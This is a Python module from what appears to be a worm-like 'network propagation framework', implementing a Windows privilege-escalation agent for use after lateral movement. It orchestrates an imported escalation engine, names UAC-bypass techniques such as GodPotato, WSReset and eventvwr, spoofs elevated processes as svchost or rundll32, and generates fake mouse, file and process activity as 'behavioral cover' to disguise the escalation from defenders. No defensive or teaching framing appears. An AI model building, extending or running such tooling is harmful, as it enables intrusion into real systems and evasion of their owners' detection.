#!/usr/bin/env python3
"""
Phase 5: Privilege Escalation Agent - Network Propagation Framework
Post-exploitation privilege escalation following successful lateral movement

WORKFLOW:
Phase 4 (Orchestrator) → Phase 2 (Execution) → Phase 5 (Privesc)
After code execution on target, attempt to escalate privileges
"""

import logging
import platform
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime
from enum import Enum

logger = logging.getLogger("PrivescAgent")
logger.setLevel(logging.DEBUG)


class EscalationStatus(Enum):
    """Privilege escalation outcome"""
    SUCCESS = "SUCCESS"
    PARTIAL = "PARTIAL"
    FAILED = "FAILED"
    NOT_ATTEMPTED = "NOT_ATTEMPTED"
    UNSUPPORTED_PLATFORM = "UNSUPPORTED_PLATFORM"


@dataclass
class PrivescResult:
    """Result of privilege escalation attempt"""
    status: EscalationStatus
    target_ip: str
    platform: str
    threat_level: int  # 0-100
    vectors_detected: int
    technique_used: Optional[str]
    elevated_privilege: Optional[str]  # SYSTEM, root, etc.
    success_probability: float  # 0.0-1.0
    mitre_technique: Optional[str]
    error_message: Optional[str]
    timestamp: str
    detection_chain: Optional[List[str]] = None

    def __post_init__(self):
        if self.detection_chain is None:
            self.detection_chain = []


class PrivescAgent:
    """Privilege escalation agent for post-exploitation phase"""
    
    def __init__(self, timeout: int = 60):
        self.timeout = timeout
        self.logger = logging.getLogger("PrivescAgent")
        
        # Initialize user activity emulator for behavioral cover
        try:
            from user_activity_emulator import UserActivityEmulator
            self.emulator = UserActivityEmulator()
            self.logger.info("[✅] UserActivityEmulator initialized")
        except ImportError:
            self.emulator = None
            self.logger.warning("[⚠️] UserActivityEmulator unavailable - behavioral cover disabled")
        
        # Try to import privesc module
        try:
            from agents.privesc import PrivescEngine, PrivescVector, EscalationResult
            self.PrivescEngine = PrivescEngine
            self.PrivescVector = PrivescVector
            self.EscalationResult = EscalationResult
            self.PRIVESC_AVAILABLE = True
            self.logger.info("[✅] Privesc module available")
        except ImportError as e:
            self.PRIVESC_AVAILABLE = False
            self.logger.warning(f"[⚠️] Privesc module unavailable: {e}")
    
    def assess_target(self, target_ip: str, platform_name: str = "Windows") -> Dict:
        """
        Assess target for privilege escalation opportunities
        Returns threat level and available vectors
        """
        if not self.PRIVESC_AVAILABLE:
            self.logger.warning("[⚠️] Privesc assessment skipped - module unavailable")
            return {
                'platform': platform_name,
                'threat_level': 0,
                'vectors': [],
                'assessment_possible': False
            }
        
        if platform_name != "Windows":
            self.logger.warning(f"[⚠️] Only Windows supported currently, got {platform_name}")
            return {
                'platform': platform_name,
                'threat_level': 0,
                'vectors': [],
                'assessment_possible': False
            }
        
        try:
            engine = self.PrivescEngine()
            assessment = engine.assess_environment()
            
            self.logger.info(f"[✅] Privesc assessment complete for {target_ip}")
            self.logger.info(f"    Threat level: {assessment.get('threat_level', 0)}/100")
            self.logger.info(f"    Vectors detected: {len(assessment.get('threat_components', {}))}")
            
            return {
                'platform': platform_name,
                'threat_level': assessment.get('threat_level', 0),
                'vectors': [
                    {
                        'type': k,
                        'score': v
                    }
                    for k, v in assessment.get('threat_components', {}).items()
                    if v > 0
                ],
                'detected_vectors': len([v for v in assessment.get('threat_components', {}).values() if v > 0]),
                'exploit_scores': assessment.get('assessment', {}).get('exploit_scores', {}),
                'assessment_possible': True,
                'escalation_possible': assessment.get('escalation_possible', False)
            }
        
        except Exception as e:
            self.logger.error(f"[!] Privesc assessment failed: {e}")
            return {
                'platform': platform_name,
                'threat_level': 0,
                'vectors': [],
                'assessment_possible': False,
                'error': str(e)
            }
    
    def attempt_escalation(self, target_ip: str, 
                          platform_name: str = "Windows",
                          detected_vectors: int = 0,
                          threat_level: int = 0) -> PrivescResult:
        """
        Attempt privilege escalation on target
        """
        timestamp = datetime.utcnow().isoformat()
        
        if not self.PRIVESC_AVAILABLE:
            self.logger.warning("[⚠️] Escalation skipped - privesc module unavailable")
            return PrivescResult(
                status=EscalationStatus.NOT_ATTEMPTED,
                target_ip=target_ip,
                platform=platform_name,
                threat_level=threat_level,
                vectors_detected=detected_vectors,
                technique_used=None,
                elevated_privilege=None,
                success_probability=0.0,
                mitre_technique=None,
                error_message="Privesc module unavailable",
                timestamp=timestamp
            )
        
        if platform_name != "Windows":
            self.logger.warning(f"[⚠️] Escalation skipped - unsupported platform: {platform_name}")
            return PrivescResult(
                status=EscalationStatus.UNSUPPORTED_PLATFORM,
                target_ip=target_ip,
                platform=platform_name,
                threat_level=threat_level,
                vectors_detected=detected_vectors,
                technique_used=None,
                elevated_privilege=None,
                success_probability=0.0,
                mitre_technique=None,
                error_message=f"Unsupported platform: {platform_name}",
                timestamp=timestamp
            )
        
        # If threat level is too low, skip escalation
        if threat_level < 30:
            self.logger.info(f"[ℹ️] Threat level too low ({threat_level}/100) - escalation skipped")
            return PrivescResult(
                status=EscalationStatus.NOT_ATTEMPTED,
                target_ip=target_ip,
                platform=platform_name,
                threat_level=threat_level,
                vectors_detected=detected_vectors,
                technique_used=None,
                elevated_privilege=None,
                success_probability=0.0,
                mitre_technique=None,
                error_message="Threat level insufficient for escalation",
                timestamp=timestamp
            )
        
        try:
            engine = self.PrivescEngine()
            
            self.logger.info(f"[*] Attempting escalation on {target_ip}")
            self.logger.info(f"    Threat level: {threat_level}/100")
            self.logger.info(f"    Detected vectors: {detected_vectors}")
            
            # Get assessment first
            assessment = engine.assess_environment()
            
            # Attempt escalation
            result = engine.attempt_escalation()
            
            if result and result.success:
                self.logger.info(f"[✅] Escalation successful!")
                self.logger.info(f"    Technique: {result.technique_used}")
                self.logger.info(f"    Privilege: {result.elevated_privilege}")
                self.logger.info(f"    MITRE: {result.mitre_technique}")
                
                return PrivescResult(
                    status=EscalationStatus.SUCCESS,
                    target_ip=target_ip,
                    platform=platform_name,
                    threat_level=threat_level,
                    vectors_detected=detected_vectors,
                    technique_used=result.technique_used,
                    elevated_privilege=result.elevated_privilege,
                    success_probability=min(1.0, result.exploit_score + 0.1),
                    mitre_technique=result.mitre_technique,
                    error_message=None,
                    timestamp=timestamp,
                    detection_chain=[result.technique_used]
                )
            
            elif result and result.success is False:
                self.logger.warning(f"[!] Escalation attempt failed: {result.error_message}")
                
                return PrivescResult(
                    status=EscalationStatus.FAILED,
                    target_ip=target_ip,
                    platform=platform_name,
                    threat_level=threat_level,
                    vectors_detected=detected_vectors,
                    technique_used=result.technique_used,
                    elevated_privilege=None,
                    success_probability=result.exploit_score,
                    mitre_technique=result.mitre_technique,
                    error_message=result.error_message,
                    timestamp=timestamp
                )
            
            else:
                self.logger.warning("[!] No escalation result returned")
                return PrivescResult(
                    status=EscalationStatus.FAILED,
                    target_ip=target_ip,
                    platform=platform_name,
                    threat_level=threat_level,
                    vectors_detected=detected_vectors,
                    technique_used=None,
                    elevated_privilege=None,
                    success_probability=0.0,
                    mitre_technique=None,
                    error_message="No escalation result",
                    timestamp=timestamp
                )
        
        except Exception as e:
            self.logger.error(f"[!] Escalation attempt failed: {e}")
            return PrivescResult(
                status=EscalationStatus.FAILED,
                target_ip=target_ip,
                platform=platform_name,
                threat_level=threat_level,
                vectors_detected=detected_vectors,
                technique_used=None,
                elevated_privilege=None,
                success_probability=0.0,
                mitre_technique=None,
                error_message=str(e),
                timestamp=timestamp
            )
    
    def emit_behavioral_cover(self, threat_level: int = 50, intention: str = "work") -> bool:
        """
        Emit realistic user activity for behavioral cover before escalation.
        
        This integrates with UserActivityEmulator to emit background noise:
        - Mouse movements (Bezier curves)
        - File operations
        - Process launches (legitimate apps)
        - Keyboard activity (if safe context)
        
        Should be called BEFORE attempt_escalation() to establish baseline activity.
        
        Args:
            threat_level: Threat score (0-100) to scale activity intensity
            intention: User activity type ("work", "browse", "compose", "research")
        
        Returns:
            True if emulator initialized successfully, False otherwise
        """
        try:
            from user_activity_emulator import UserActivityEmulator
            
            self.logger.info(f"[🎭] Emitting behavioral cover (threat={threat_level}, intent={intention})...")
            
            emulator = UserActivityEmulator()
            
            # Emit realistic user activity at specified threat level
            # Higher threat = more aggressive activity pattern
            emulator.emit_user_activity(
                threat_level=threat_level,
                intention=intention.lower()
            )
            
            # Wait for activities to complete (with timeout)
            self.logger.debug(f"[🎭] Waiting for background activities to complete...")
            completed = emulator.wait_for_activities(timeout=15)
            
            if completed:
                self.logger.info(f"[✅] Behavioral cover emitted successfully")
            else:
                self.logger.warning(f"[⚠️] Some background activities did not complete in time")
            
            return True
        
        except ImportError:
            self.logger.warning(f"[⚠️] UserActivityEmulator not available - behavioral cover skipped")
            return False
        except Exception as e:
            self.logger.warning(f"[⚠️] Behavioral cover error: {e}")
            return False
    
    def trigger_uac_escalation_with_cover(self, process_name: str = "svchost", args: str = "/c whoami /all") -> bool:
        """
        Trigger UAC elevation with behavioral cover as fallback after silent methods fail.
        
        This is called AFTER silent methods (GodPotato, WSReset, eventvwr) fail.
        Uses improved auto-click logic with DPI awareness and retry.
        
        Args:
            process_name: Process to spoof as ("svchost", "dllhost", "rundll32", etc.)
            args: Command arguments to pass to elevated process
            
        Returns:
            True if UAC escalation was triggered, False otherwise
        """
        if not self.emulator:
            self.logger.warning("[⚠️] Emulator unavailable - UAC escalation skipped")
            return False
        
        try:
            self.logger.info(f"[🎭] Emitting behavioral cover before UAC trigger...")
            self.emit_behavioral_cover(threat_level=85, intention="work")
            
            self.logger.info(f"[🔐] Triggering UAC escalation as '{process_name}'...")
            result = self.emulator.uac_escalate_as_process(
                process_name=process_name,
                args=args
            )
            
            if result:
                self.logger.info(f"[✅] UAC escalation triggered (process={process_name})")
                self.logger.info(f"    User must click 'Yes' on UAC prompt to continue")
            else:
                self.logger.warning(f"[!] UAC escalation trigger failed")
            
            return result
        
        except Exception as e:
            self.logger.error(f"[!] UAC escalation error: {e}")
            return False
    
    def full_post_exploitation_chain(self, target_ip: str,
                                     platform_name: str = "Windows") -> Tuple[PrivescResult, Dict]:
        """
        Complete post-exploitation chain:
        Assessment → Behavioral Cover → Escalation attempt → Result tracking
        """
        # Phase 1: Assessment
        assessment = self.assess_target(target_ip, platform_name)
        threat_level = assessment.get('threat_level', 50)
        
        # Phase 1.5: Emit behavioral cover (mouse, files, processes) before escalation
        # This makes the escalation attempt look like natural user activity
        self.emit_behavioral_cover(threat_level=threat_level, intention="work")
        
        # Phase 2: Escalation attempt
        result = self.attempt_escalation(
            target_ip=target_ip,
            platform_name=platform_name,
            threat_level=threat_level,
            detected_vectors=assessment.get('detected_vectors', 0)
        )
        
        return result, assessment


if __name__ == "__main__":
    # Test the agent
    agent = PrivescAgent()
    
    # Test assessment
    print("[*] Testing Phase 5 (Privesc Agent)")
    assessment = agent.assess_target("192.168.1.100", "Windows")
    print(f"[+] Assessment: threat_level={assessment.get('threat_level')}/100, "
          f"vectors={assessment.get('detected_vectors')}")
    
    # Test escalation
    result, assessment = agent.full_post_exploitation_chain("192.168.1.100", "Windows")
    print(f"[+] Escalation result: status={result.status.value}, "
          f"privilege={result.elevated_privilege}, "
          f"success_prob={result.success_probability:.1%}")
